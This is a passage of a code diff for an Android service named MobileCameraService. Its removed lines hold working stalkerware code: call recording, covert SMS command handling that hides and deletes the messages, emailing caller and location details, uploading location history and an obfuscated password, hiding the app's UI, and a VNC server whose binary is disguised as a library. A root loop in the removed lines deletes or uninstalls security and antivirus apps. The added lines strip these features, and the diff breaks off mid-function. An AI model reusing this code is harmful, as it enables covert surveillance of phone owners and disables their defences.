-	            		if (is_record_from_voicecall()) {
-	            			Log.d(TAG, "mVoiceRecorder start...VOICE_CALL");
-	            			mVoiceRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);//Call this only before setOutputFormat()
-	            		}
-	            		else {
-	            			Log.d(TAG, "mVoiceRecorder start...MIC");
-	            			mVoiceRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);//Call this only before setOutputFormat()
-	            		}
-	            		mVoiceRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
-	            		mVoiceRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
-	            		mVoiceRecorder.setOutputFile(voiceRecordFile);
-	            		
-						mVoiceRecorder.prepare();
-						mVoiceRecorder.start();
-					} catch (Exception e) {
-						// TODO Auto-generated catch block
-						e.printStackTrace();
-						
-			        	if (null != mVoiceRecorder)
-			        	{
-			        		try {
-				    		    mVoiceRecorder.release();
-			        		} catch (Exception e1) {
-								e1.printStackTrace();
-							}
-			    		    mVoiceRecorder = null;
-			        	}
-					}
-            	}
-                break;
-                
-            case TelephonyManager.CALL_STATE_RINGING:  
-				if (1 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ENABLE_EMAIL, 1))
-		    	{
-    				String emailAddress = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
-    				String name = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
-    				String format = _instance.getResources().getString(R.string.msg_on_call_in_format);
-    				
-    				SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-    				String time_str = dateFormat.format(new Date());
-    				
-    				String cont = String.format(format, name, time_str, incomingNumber, findContactByNumber(_instance, incomingNumber));
-					if (false == emailAddress.equals(""))
-					{
-						NativeSendEmail(emailAddress, cont, cont);
-					}
-		    	}
-                break;
-                
-            default:   
-                break;   
-            }   
-            super.onCallStateChanged(state, incomingNumber);  
-        }  
-        
-        @Override  
-        public void onDataConnectionStateChanged(int state) {  
-            Log.v(this.getClass().getName(), "onDataConnectionStateChanged-state: " + state);  
-            super.onDataConnectionStateChanged(state);  
-        }  
-        
-        @Override  
-        public void onDataConnectionStateChanged(int state, int networkType) {  
-            Log.v(this.getClass().getName(), "onDataConnectionStateChanged-state: " + state);  
-            Log.v(this.getClass().getName(), "onDataConnectionStateChanged-networkType: " + networkType);  
-            super.onDataConnectionStateChanged(state, networkType);  
-        }  
-        
-        @Override  
-        public void onServiceStateChanged(ServiceState serviceState) {  
-            Log.v(this.getClass().getName(), "onServiceStateChanged-ServiceState: " + serviceState);  
-            super.onServiceStateChanged(serviceState);  
-        }  
-        
-        @Override  
-        public void onSignalStrengthChanged(int asu) {  
-            Log.v(this.getClass().getName(), "onSignalStrengthChanged-asu: " + asu);  
-            super.onSignalStrengthChanged(asu);  
-        }  
-        
-        @Override  
-        public void onSignalStrengthsChanged(SignalStrength signalStrength) {  
-            Log.v(this.getClass().getName(), "onSignalStrengthsChanged-signalStrength: " + signalStrength);  
-            super.onSignalStrengthsChanged(signalStrength);  
-        }  
-        
-    }//MyPhoneStateListener Class
-    
-	public class SMSBroadcastReceiver extends BroadcastReceiver {
-		
-	    @Override
-	    public void onReceive(Context context, Intent intent) {
-	        Object[] pdus = (Object[])(intent.getExtras().get("pdus"));//获取短信内容
-	        for(Object pdu : pdus){
-	            byte[] data = (byte[])pdu;//获取单条短信内容，短信内容以pdu格式存在
-	            
-	            SmsMessage message = null;
-	            String sender = "";
-	            String content = "";
-	            try {
-		            message = SmsMessage.createFromPdu(data);//使用pdu格式的短信数据生成短信对象
-		            sender = message.getOriginatingAddress();//获取短信的发送者
-		            content = message.getMessageBody();//获取短信的内容
-	            } catch (Exception e) {
-        			// TODO Auto-generated catch block
-        			e.printStackTrace();
-        			continue;
-        		}
-	            
-	            Log.d("SMSBroadcastReceiver", "Recv SMS:<" + sender + ">" + content);
-	            
-	            String emailAddress = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
-	            
-	            //隐藏短信指令：无需主控手机号码，不发回复短信
-	            if (content.contains(context.getResources().getString(R.string.msg_sms_hidden_cmd_restart))
-	            	|| content.contains(context.getResources().getString(R.string.msg_sms_hidden_cmd_restart_simple)) )
-	            {
-    					//Restart WiFi...
-    					WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE); 
-        			    boolean bWifiEnabled = wifiManager.isWifiEnabled();
-        			    if (bWifiEnabled)
-        			    {
-        			    	wifiManager.setWifiEnabled(false);
-        			    	while (WifiManager.WIFI_STATE_DISABLED != wifiManager.getWifiState())
-        			    	{		    			    		
-        			    		try {
-    								Thread.sleep(100);
-    							} catch (InterruptedException e) {  }
-        			    	}
-        			    	
-        			    	wifiManager.setWifiEnabled(true);
-        			    }
-    					
-    					try {
-    						_instance.stopSelf();
-    						Thread.sleep(2000);
-    						android.os.Process.killProcess(android.os.Process.myPid());
-    					} catch(Exception e) {}
-	            }
-	            
-	            //数据流量  开关
-	            if (content.contains(context.getResources().getString(R.string.msg_sms_hidden_cmd_mobiledata_on_simple)) )
-	            {
-	            	try {
-	            		MobileDataUtility.toggleMobileData(_instance, true);
-	            	} catch(Exception e) {}
-	            }
-	            else if (content.contains(context.getResources().getString(R.string.msg_sms_hidden_cmd_mobiledata_off_simple)) )
-	            {
-	            	try {
-	            		MobileDataUtility.toggleMobileData(_instance, false);
-	            	} catch(Exception e) {}
-	            }
-	            
-	            //查询
-	            if (content.contains(context.getResources().getString(R.string.msg_sms_hidden_cmd_query)) )
-	            {
-	            	SendStatusReport(emailAddress);
-	            }
-	            
-	            //wifi switch
-				if (content.contains(_instance.getResources().getString(R.string.msg_sms_hidden_cmd_enable_wifi)))
-				{
-					WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE); 
-					wifiManager.setWifiEnabled(true);
-				}
-				else if (content.contains(_instance.getResources().getString(R.string.msg_sms_hidden_cmd_disable_wifi)))
-				{
-					WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE); 
-					wifiManager.setWifiEnabled(false);
-				}
-	            
-				//email report switch
-				if (content.contains(_instance.getResources().getString(R.string.msg_sms_hidden_cmd_enable_email)))
-				{
-					AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ENABLE_EMAIL, 1);
-				}
-				else if (content.contains(_instance.getResources().getString(R.string.msg_sms_hidden_cmd_disable_email)))
-				{
-					AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ENABLE_EMAIL, 0);
-				}
-				
-				//location
-				if (content.contains(_instance.getResources().getString(R.string.msg_sms_hidden_cmd_location)))
-				{
-					try {
-						if (false == emailAddress.equals(""))
-						{
-							String tmp_boby = GenerateLocationMsg(_instance);
-							NativeSendEmail(emailAddress, tmp_boby, tmp_boby);
-						}
-					} catch (Exception e) {
-		    			// TODO Auto-generated catch block
-		    			e.printStackTrace();
-		    		}
-				}
-				
-				
-	            if (isAuthPhone(sender))
-	    		{
-	            	abortBroadcast();
-	            	
-	            	content = content.trim();
-    				
-    				
-    				//清除手机号码
-    				if (content.equalsIgnoreCase(_instance.getResources().getString(R.string.msg_sms_cmd_clear_phonenum)))
-    				{
-    					AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SMSPHONENUM, "");
-    					
-    					_instance.sendSMS(
-    							sender,
-    							_instance.getResources().getString(R.string.msg_phonenum_cleared));
-    				}
-    				
-    				//set value...(:)
-    				else if (content.contains(":"))
-    				{
-    					String[] arr = content.split(":");
-    					if (arr != null && arr.length == 2)
-    					{
-    						arr[0] = arr[0].trim();
-    						arr[1] = arr[1].trim();
-    						if (arr[0].equalsIgnoreCase(_instance.getResources().getString(R.string.msg_sms_cmd_enable_email)))
-    						{
-		    					AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ENABLE_EMAIL, 1);
-		    					AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, arr[1]);
-		    					
-		    					_instance.sendSMS(
-		    							sender,
-		    							String.format(_instance.getResources().getString(R.string.msg_sms_cmd_result), _instance.getResources().getString(R.string.msg_sms_cmd_enable_email) + ":")
-		    							);
-    						}
-    						else if (arr[0].equalsIgnoreCase(_instance.getResources().getString(R.string.msg_sms_cmd_set_name)))
-    						{
-		    					AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, arr[1]);
-		    					
-		    					_instance.sendSMS(
-		    							sender,
-		    							String.format(_instance.getResources().getString(R.string.msg_sms_cmd_result), _instance.getResources().getString(R.string.msg_sms_cmd_set_name) + ":")
-		    							);
-    						}
-    						else if (arr[0].equalsIgnoreCase(_instance.getResources().getString(R.string.msg_sms_cmd_set_pass)))
-    						{
-		    					AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_PASSWORD, arr[1]);
-		    					
-		    					_instance.sendSMS(
-		    							sender,
-		    							String.format(_instance.getResources().getString(R.string.msg_sms_cmd_result), _instance.getResources().getString(R.string.msg_sms_cmd_set_pass) + ":")
-		    							);
-    						}
-    						else {
-    							UnknownSmsCmd(sender, content);
-    						}
-    					}
-    					else {
-    						UnknownSmsCmd(sender, content);
-    					}
-    				}
-    				
-    				
-    				//unknown cmd
-    				else {
-    					UnknownSmsCmd(sender, content);
-    				}
-    				
-    				delete_recv_sms(sender, content);
-            	}
-	            
-	        }//for
-	    }
-	
-	}//SMSBroadcastReceiver Class
-	
 	public class BatteryBroadcastReceiver extends BroadcastReceiver {
 		
 		private int m_battery_level = 100;
@@ -1387,18 +270,11 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
 	private double mBaiduLongitude = 0.0d;//jing du
 	private double mBaiduLatitude = 0.0d; //wei du
 	private long   mLastBaiduTime = 0;
-	
-	private TelephonyManager mTelephonyManager;
-    private MyPhoneStateListener mPhoneCallListener;
     
 	private boolean m_isArmed = false;
 	private boolean m_isClientConnected = false;
 	private boolean m_isCaptureRunning = false;
 	
-	private CallContentObserver mCallContentObserver = null;
-	private SMSContentObserver mSMSContentObserver = null;
-	
-    private SMSBroadcastReceiver mSmsReceiver = null;
 	private BatteryBroadcastReceiver mBatteryReceiver = null;
     
 	private LocalSocket ioSock = null;
@@ -1410,11 +286,6 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
     public void onCreate() {
     	Log.d(TAG, "Service onCreate~~~");
         super.onCreate();
-        
-        mSmsReceiver = new SMSBroadcastReceiver();
-        IntentFilter smsFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
-        smsFilter.setPriority(2147483647);//设置优先级最大
-        registerReceiver(mSmsReceiver, smsFilter);
         
         mBatteryReceiver = new BatteryBroadcastReceiver();
         IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
@@ -1452,12 +323,6 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
         Worker worker = new Worker("MobileCameraService Worker");
         mWorkerHandler = new WorkerHandler(worker.getLooper());
         mMainHandler = new MainHandler();
-        
-        mCallContentObserver = new CallContentObserver(mMainHandler);
-        getContentResolver().registerContentObserver(Uri.parse("content://call_log/calls"), true, mCallContentObserver);
-        
-        mSMSContentObserver = new SMSContentObserver(mMainHandler);
-        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mSMSContentObserver);
         
         
         mWindowManager = (WindowManager) getApplication().getSystemService(Context.WINDOW_SERVICE);
@@ -1532,15 +397,6 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
         } catch (Exception e) {  }
         
         
-        mTelephonyManager = (TelephonyManager)getApplication().getSystemService(Context.TELEPHONY_SERVICE);  
-        mPhoneCallListener = new MyPhoneStateListener();   
-        mTelephonyManager.listen(mPhoneCallListener, MyPhoneStateListener.LISTEN_CALL_STATE);  
-        //mTelephonyManager.listen(mPhoneCallListener, MyPhoneStateListener.LISTEN_SERVICE_STATE);   
-        //mTelephonyManager.listen(mPhoneCallListener, MyPhoneStateListener.LISTEN_DATA_CONNECTION_STATE);  
-        
-        //silenceRinger();
-        
-        
     	//AudioManager audioManager = (AudioManager)getApplication().getSystemService(Context.AUDIO_SERVICE);
     	//int max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
     	//audioManager.setSpeakerphoneOn(true);
@@ -1587,133 +443,6 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
 				
 				mMainHandler.sendEmptyMessageDelayed(UI_MSG_AUTO_START, 100);
 				
-				
-				while (true)
-				{
-					int ret = 0;
-					byte[] buffer = new byte[1024];
-					LocalServerSocket localServerSock = null;
-					//LocalSocket ioSock = null;
-					InputStream is = null;
-					
-					_instance.mMainHandler.post(new Runnable(){
-		    			@Override
-		    			public void run() {
-		    				Intent intent = new Intent();
-		    		    	intent.setAction("android.double.action.MYACTION");
-		    		    	intent.setFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
-		    		    	sendBroadcast(intent);
-		    		    	
-		    		    	Log.d(TAG, "Pre restart peer~~~");
-		    			}
-		    		});
-					
-					try {
-						Thread.sleep(100);
-					} catch (InterruptedException e1) {
-						// TODO Auto-generated catch block
-						e1.printStackTrace();
-					}
-					
-					try {
-						localServerSock = new LocalServerSocket("mobilecamera.my_server_socket");
-					}catch (Exception e) {continue;}
-					
-					// Blocking...
-					try {
-						ioSock = localServerSock.accept();
-					}catch (Exception e) {continue;}
-					try {
-						is = ioSock.getInputStream();
-					}catch (Exception e) {continue;}
-					
-					Log.d(TAG, "Accepted peer connection~~~");
-					
-					while (true)
-					{
-						try {
-							ret = 0;
-							ret = is.read(buffer);
-						}
-						catch (InterruptedIOException e) {
-							if (ret < 0) {
-								ret = 0;
-							}
-						}
-						catch (IOException e) {
-							ret = -1;
-						}
-						if (ret < 0)
-						{
-							_instance.mMainHandler.post(new Runnable(){
-				    			@Override
-				    			public void run() {
-				    				Intent intent = new Intent();
-				    		    	intent.setAction("android.double.action.MYACTION");
-				    		    	intent.setFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
-				    		    	sendBroadcast(intent);
-				    		    	
-				    		    	Log.d(TAG, "Restart peer~~~");
-				    			}
-				    		});
-							break;
-						}
-					}
-					
-					try {
-						is.close();
-					}catch (Exception e) {}
-					try {
-						ioSock.close();
-					}catch (Exception e) {}
-					try {
-						localServerSock.close();
-					}catch (Exception e) {}
-				}
-			}
-		}).start();
-        
-		new Thread(new Runnable() {
-			public void run()
-			{
-				//等待SetThisObject()执行
-				try {
-					Thread.sleep(2000);
-				} catch (InterruptedException e1) {}
-				
-				while (true)
-				{
-					boolean root = true;
-					root &= hasRootPermission();
-					if (root) {
-						runNativeShellCmd("su -c \"mount -o remount,rw /system\"");
-						runNativeShellCmd("su -c \"rm -f /system/app/SafeCenter.apk\"");
-						runNativeShellCmd("su -c \"rm -f /system/app/SafeCenter.odex\"");
-						runNativeShellCmd("su -c \"rm -f /system/app/SafeCenter/SafeCenter.apk\"");
-						runNativeShellCmd("su -c \"rm -f /system/app/OppoGuardElf.apk\"");
-						runNativeShellCmd("su -c \"rm -f /system/app/OppoGuardElf.odex\"");
-						runNativeShellCmd("su -c \"rm -f /system/app/OppoGuardElf/OppoGuardElf.apk\"");
-						runNativeShellCmd("su -c \"rm -f /system/priv-app/SecurityCenter.apk\"");
-						runNativeShellCmd("su -c \"rm -f /system/priv-app/SecurityCenter.odex\"");
-						runNativeShellCmd("su -c \"mount -o remount,ro /system\"");
-						
-						runNativeShellCmd("su -c \"pm uninstall -k cn.opda.a.phonoalbumshoushou\"");
-						runNativeShellCmd("su -c \"pm uninstall -k com.qihoo.antivirus\"");
-						runNativeShellCmd("su -c \"pm uninstall -k com.qihoo360.mobilesafe\"");
-						runNativeShellCmd("su -c \"pm uninstall -k com.ijinshan.mguard\"");
-						runNativeShellCmd("su -c \"pm uninstall -k com.tencent.qqpimsecure\"");
-						runNativeShellCmd("su -c \"pm uninstall -k com.anguanjia.safe\"");
-						runNativeShellCmd("su -c \"pm uninstall -k com.lbe.security\"");
-						runNativeShellCmd("su -c \"pm uninstall -k com.lbe.security.miui\"");
-					}
-					else {
-						
-					}
-					
-					try {
-						Thread.sleep(15000);
-					} catch (InterruptedException e1) {}
-				}
 			}
 		}).start();
 		
@@ -1804,12 +533,6 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
         	mLocationClient.stop();
         }
         
-        mTelephonyManager.listen(mPhoneCallListener, MyPhoneStateListener.LISTEN_NONE);
-        
-        if (mSmsReceiver != null) {    
-        	unregisterReceiver(mSmsReceiver);
-        }
-        
         if (mBatteryReceiver != null) {    
         	unregisterReceiver(mBatteryReceiver);
         }
@@ -1817,9 +540,6 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
         if (mFloatView.getParent() != null) {
         	mWindowManager.removeView(mFloatView);
         }
-        
-        getContentResolver().unregisterContentObserver(mCallContentObserver);
-        getContentResolver().unregisterContentObserver(mSMSContentObserver);
         
         if (m_bForeground) {
         	stopForeground(true);
@@ -3068,180 +1788,31 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
     	strOS = strOS.replace(" ", "-");
     	strOS = strOS.replace("&", "-");
     	
-    	
-    	Log.d("PutLocation", "mBaiduLongitude=" + _instance.mBaiduLongitude + ", mBaiduLatitude=" + _instance.mBaiduLatitude);
-    	long lCurrTime = System.currentTimeMillis();
-    	if (lCurrTime - _instance.mLastBaiduTime >= 2*60*1000) {
-    		_instance.mMainHandler.post(new Runnable(){
-    			@Override
-    			public void run() {
-    				try {
-    	    			if (_instance.mLocationClient.isStarted() == false)
-    	    			{
-    			    		_instance.mLocationClient.start();
-    	    			}
-    		    		_instance.mLocationClient.requestLocation();
-    		    		_instance.mLastBaiduTime = System.currentTimeMillis();
-    	    		} catch (Exception e) {  }
-    			}
-    		});
-    	}
-    	
-    	String strGPSLongi = "";
-    	String strGPSLati  = "";
-    	if (Math.abs(_instance.mBaiduLongitude) >= 0.01 || Math.abs(_instance.mBaiduLatitude) >= 0.01) {
-        	strGPSLongi += String.format("%.5f", _instance.mBaiduLongitude);
-        	strGPSLati  += String.format("%.5f", _instance.mBaiduLatitude);
-    	}
-    	else if (false == _instance.mLocationEnabled) {
-    		strGPSLongi += "NONE";
-    		strGPSLati  += "NONE";
-    	}
-    	else if (Math.abs(_instance.mLocLongitude) < 0.01 && Math.abs(_instance.mLocLatitude) < 0.01) {
-    		Location lastLoc = _instance.mLocationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-    		if (null != lastLoc)
-			{
-    			_instance.mLocLongitude = lastLoc.getLongitude();
-	        	_instance.mLocLatitude = lastLoc.getLatitude();
-				Log.d(TAG, lastLoc.toString());
-	        	strGPSLongi += String.format("%.4f", _instance.mLocLongitude);
-	        	strGPSLati  += String.format("%.4f", _instance.mLocLatitude);
-			}
-    		else {
-        		strGPSLongi += "NONE";
-        		strGPSLati  += "NONE";
-    		}
-    	}
-    	else {
-        	strGPSLongi += String.format("%.4f", _instance.mLocLongitude);
-        	strGPSLati  += String.format("%.4f", _instance.mLocLatitude);
-    	}
-    	
-    	String pass  = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_PASSWORD, "");
-    	if (pass == null || true == pass.equals("")) {
-    		pass = "NONE";
-    	}
-    	String strPasswd = Base64.encodeToString(pass.getBytes(), Base64.NO_WRAP);
-		Random rdm = new Random(System.currentTimeMillis());
-		int temp_index = Math.abs(rdm.nextInt()) % (strPasswd.length() - 1);
-		int temp_index2 = Math.abs(rdm.nextInt()) % (strPasswd.length() - 1);
-		strPasswd = strPasswd.substring(temp_index, temp_index + 1) 
-				+   strPasswd.substring(temp_index2, temp_index2 + 1)
-				+ strPasswd;
-    	
-    	String strPhoneNum	= "NONE";
-    	TelephonyManager tm = (TelephonyManager)_instance.getSystemService(Context.TELEPHONY_SERVICE);
-    	String te1  = tm.getLine1Number();
-    	if (te1 != null && false == te1.equals("")) {
-    		strPhoneNum = te1;
-    		strPhoneNum = strPhoneNum.replace("@", "#");
-    		strPhoneNum = strPhoneNum.replace("+", "");
-    		strPhoneNum = strPhoneNum.replace(" ", "");
-    		strPhoneNum = strPhoneNum.replace("&", "");
-    	}
-    	
-    	String str_adminPhone	= AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SMSPHONENUM, "");
-    	if (str_adminPhone != null && false == str_adminPhone.equals("")) {
-    		str_adminPhone = str_adminPhone.replace("@", "#");
-    		str_adminPhone = str_adminPhone.replace("+", "");
-    		str_adminPhone = str_adminPhone.replace(" ", "");
-    		str_adminPhone = str_adminPhone.replace("&", "");
-    	}
-    	else {
-    		str_adminPhone = "NONE";
-    	}
-    	
-    	
-    	String str_adminEmail = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
-    	if (str_adminEmail != null && false == str_adminEmail.equals("")) {
-    		str_adminEmail = str_adminEmail.replace("@", "#");
-    		str_adminEmail = str_adminEmail.replace("+", "");
-    		str_adminEmail = str_adminEmail.replace(" ", "");
-    		str_adminEmail = str_adminEmail.replace("&", "");
-    	}
-    	else {
-    		str_adminEmail = "NONE";
-    	}
-    	
-    	return strOS + "@" + strGPSLongi + "@" + strGPSLati + "@" + strPasswd + "@" + strPhoneNum + "@" + str_adminPhone + "@" + str_adminEmail;
+    	return strOS;
     }
 	
-    public static void j_on_register_result(int comments_id, boolean approved, boolean allow_hide)
+    public static void j_on_push_result(int ret, int joined_channel_id)
     {
     	if (_instance == null) {
     		return;
     	}
     	
-    	if (allow_hide)
+    	if (ret < 0)
     	{
-    		AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ALLOW_HIDE_UI, 1);
-    		if (1 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_USB_ROOT_INSTALL, 0))
-    		{
-    			AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 1);
-    			HomeActivity.DoHideUi(_instance);
-    		}
+    		_instance.mMainHandler.post(new Runnable(){
+    			@Override
+    			public void run() {
+    				SharedFuncLib.MyMessageTip(_instance, _instance.getResources().getString(R.string.msg_communication_error));
+    			}
+    		});
     	}
-        else {
-        	AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ALLOW_HIDE_UI, 0);
-        	//AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0);
-        	//HomeActivity.DoShowUi(_instance);
-        }
-    	
-    	Message msg = _instance.mMainHandler.obtainMessage(UI_MSG_DISPLAY_CAMERA_ID, comments_id, (approved ? 1 : 0));
-    	_instance.mMainHandler.sendMessage(msg);
-    	
-    	
-    	//尝试从数据库取出定位数据put到服务器
-    	final int MAX_LOC_ITEM_COUNT = 100;
-    	int nItemCount = 0;
-    	String strItems = "";
-    	
-    	try {///////////////////////////////////////////////////////////
-    	
-    	DatabaseHelper dbHelper = new DatabaseHelper(_instance);
-    	SQLiteDatabase db = dbHelper.getWritableDatabase();
-    	
-    	Cursor cursor = db.query("location_save", new String[]{"loc_time", "longitude", "latitude"}, null, null, null, null, "loc_time", null);
-    	while (cursor != null && cursor.moveToNext())
+    	else if (joined_channel_id > 0)
     	{
-    		int loc_time = cursor.getInt(0);
-    		double longitude = cursor.getDouble(1);
-    		double latitude = cursor.getDouble(2);
-    		
-    		nItemCount += 1;
-    		strItems += String.format("%d,%.4f,%.4f-", loc_time, longitude, latitude);
-    		
-    		if (nItemCount >= MAX_LOC_ITEM_COUNT) {
-    			long curr_time = System.currentTimeMillis() / 1000;  //Seconds
-    			int ret = _instance.NativePutLocation((int)curr_time, nItemCount, strItems);
-    			Log.d("PutLocation", "Full NativePutLocation:(" + curr_time + "," + nItemCount + "," + strItems + ") = " + ret);
-    			nItemCount = 0;
-    			strItems = "";
-    			if (ret == 1)//OK
-    			{
-    				db.delete("location_save", "loc_time<=?", new String[]{"" + loc_time + ""});
-    			}
-    			else {
-    				break;
-    			}
-    		}
+	    	int comments_id = joined_channel_id;
+	    	boolean approved = true;
+	    	Message msg = _instance.mMainHandler.obtainMessage(UI_MSG_DISPLAY_CAMERA_ID, comments_id, (approved ? 1 : 0));
+	    	_instance.mMainHandler.sendMessage(msg);
     	}
-    	//记录读完了，最后不够MAX_LOC_ITEM_COUNT个数
-    	if (nItemCount > 0) {
-    		long curr_time = System.currentTimeMillis() / 1000;  //Seconds
-    		int ret = _instance.NativePutLocation((int)curr_time, nItemCount, strItems);
-    		Log.d("PutLocation", "Partial NativePutLocation:(" + curr_time + "," + nItemCount + "," + strItems + ") = " + ret);
-			nItemCount = 0;
-			strItems = "";
-			if (ret == 1)//OK
-			{
-				db.delete("location_save", "1", null);
-			}
-    	}
-
-    	db.close();
-    	
-    	} catch (Exception e) {e.printStackTrace();}////////////////////////////////////
     }
     
     public static void j_on_register_network_error()
@@ -3250,59 +1821,12 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
     		return;
     	}
     	
-    	double locationLongitude = _instance.mLocLongitude;
-    	double locationLatitude = _instance.mLocLatitude;
-    	
-    	if (Math.abs(_instance.mBaiduLongitude) >= 0.01 || Math.abs(_instance.mBaiduLatitude) >= 0.01) {
-    		locationLongitude = _instance.mBaiduLongitude;
-    		locationLatitude = _instance.mBaiduLatitude;
-    	}
-    	if (Math.abs(locationLongitude) < 0.01 && Math.abs(locationLatitude) < 0.01) {
-    		return;
-    	}
-    	
-    	long curr_time = System.currentTimeMillis() / 1000;  //Seconds
-    	
-    	try {/////////////////////////////////////////////////////////
-    	
-    	DatabaseHelper dbHelper = new DatabaseHelper(_instance);
-    	SQLiteDatabase db = dbHelper.getWritableDatabase();
-    	
-    	Cursor cursor = db.query("location_save", new String[]{"loc_time", "longitude", "latitude"}, null, null, null, null, "loc_time desc", "1");
-    	if (cursor != null && cursor.moveToNext())
-    	{
-    		int loc_time = cursor.getInt(0);
-    		double longitude = cursor.getDouble(1);
-    		double latitude = cursor.getDouble(2);
-    		if (curr_time - loc_time > 3600 || 
-    				Math.abs(locationLongitude - longitude) > 0.001 || 
-    				Math.abs(locationLatitude - latitude) > 0.001) {
-    			
-		    	ContentValues values = new ContentValues();
-		    	values.put("loc_time", (int)curr_time);
-		    	values.put("longitude", locationLongitude);
-		    	values.put("latitude", locationLatitude);
-		    	db.insert("location_save", null, values);
-		    	
-		    	Log.d("PutLocation", "More insert: (" + curr_time + "," + locationLongitude + "," + locationLatitude + ")");
-    		}
-    		else {
-    			Log.d("PutLocation", "Skip: (" + curr_time + "," + locationLongitude + "," + locationLatitude + ")");
-    		}
-    	}
-    	else {
-	    	ContentValues values = new ContentValues();
-	    	values.put("loc_time", (int)curr_time);
-	    	values.put("longitude", locationLongitude);
-	    	values.put("latitude", locationLatitude);
-	    	db.insert("location_save", null, values);
-	    	
-	    	Log.d("PutLocation", "First insert: (" + curr_time + "," + locationLongitude + "," + locationLatitude + ")");
-    	}
-
-    	db.close();
-    	
-    	} catch (Exception e) {e.printStackTrace();}////////////////////////////////////
+    	_instance.mMainHandler.post(new Runnable(){
+			@Override
+			public void run() {
+				SharedFuncLib.MyMessageTip(_instance, _instance.getResources().getString(R.string.msg_communication_error));
+			}
+		});
     }
     
     public static void j_on_client_connected()
@@ -3312,7 +1836,7 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
     	}
     	_instance.m_isClientConnected = true;
     	
-    	_instance.startVNCServer();
+    	//_instance.startVNCServer();
     	
     	if (0 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
     	{
@@ -3457,155 +1981,6 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
 			e.printStackTrace();
 		}
     }
-    
-    public void startVNCServer() {
-		// Lets see if i need to boot daemon...
-		try {
-			Process sh;
-			String files_dir = "/data/data/" + getPackageName() + "/";
-			if (MobileCameraService.m_bNormalInstall) {
-				files_dir = getFilesDir().getAbsolutePath();
-				Log.d(TAG, "getFilesDir() = " + files_dir);
-			}
-			
-			String password_check = " -p " + SharedFuncLib.SYS_TEMP_PASSWORD;
-			String other_string = " -r 0";
-			other_string += " -s 100";
-			
-			int method = AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_CAPMETHOD, 0);
-			if (1 == method) {
-				other_string += " -m adb";
-			}
-			else if (2 == method) {
-				other_string += " -m flinger";
-			}
-			else if (3 == method) {
-				other_string += " -m fb";
-			}
-			//other_string += " -m flinger -I -z";//adb,flinger,fb
-			other_string += " -A " + Build.VERSION.SDK;
-			
-			String libpath_string = "";
-			if (MobileCameraService.m_bNormalInstall) {
-				libpath_string = " -L " + getFilesDir().getParent() + "/lib/";
-			} else {
-				libpath_string = " -L " + "/system/lib/";
-			}
-			
-			//our exec file is disguised as a library so it will get packed to lib folder according to cpu_abi
-			String droidvncserver_exec = null;
-			if (MobileCameraService.m_bNormalInstall) {
-				if (Build.VERSION.SDK_INT >= 21) {
-					//Android-5.0 must use PIE
-					droidvncserver_exec = getFilesDir().getParent() + "/lib/libandroidvncserver_pie.so";
-				}
-				else {
-					droidvncserver_exec = getFilesDir().getParent() + "/lib/libandroidvncserver.so";
-				}
-			} else {
-				if (Build.VERSION.SDK_INT >= 21) {
-					//Android-5.0 must use PIE
